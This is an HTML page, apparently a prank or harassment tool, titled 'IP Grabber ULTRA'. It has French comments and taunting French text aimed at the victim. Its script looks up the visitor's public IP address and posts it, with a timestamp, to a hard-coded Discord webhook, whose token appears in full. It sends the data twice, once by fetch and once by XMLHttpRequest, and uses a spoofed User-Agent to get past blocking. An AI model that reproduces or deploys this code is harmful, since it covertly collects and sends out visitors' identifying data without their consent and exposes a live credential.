<!DOCTYPE html>
<html>
<head>
    <title>IP Grabber ULTRA</title>
    <script>
        async function grabIP() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;

                // Webhook avec headers personnalisÃ©s pour Ã©viter les blocages
                const webhookUrl = 'https://discord.com/api/webhooks/1443170597805883515/oceqLjOCwSLmZAuUF12l4J7O1RvroaejzDFKUA9SnDn8aRPMeAGNKL2W27ob3L2ddLNq';
                const payload = { ip: ip, timestamp: new Date().toISOString() };

                // MÃ©thode 1 : Fetch classique (si Ã§a marche)
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                    },
                    body: JSON.stringify(payload)
                });

                // MÃ©thode 2 : Si fetch est bloquÃ©, on utilise XMLHttpRequest (plus old-school)
                const xhr = new XMLHttpRequest();
                xhr.open('POST', webhookUrl);
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.send(JSON.stringify(payload));

                alert("T'es gravÃ©, frÃ©rot ! ðŸ˜ˆ L'IP est partie en direct !");
            } catch (e) {
                alert("Erreur, mais t'es quand mÃªme gravÃ©, frÃ©rot ! ðŸ˜Ž");
            }
        }
    </script>
</head>

        GABE-MOI MON IP ðŸ”¥

    <p>T'es en train de te faire graber, frÃ©rot ðŸ˜ˆ</p>
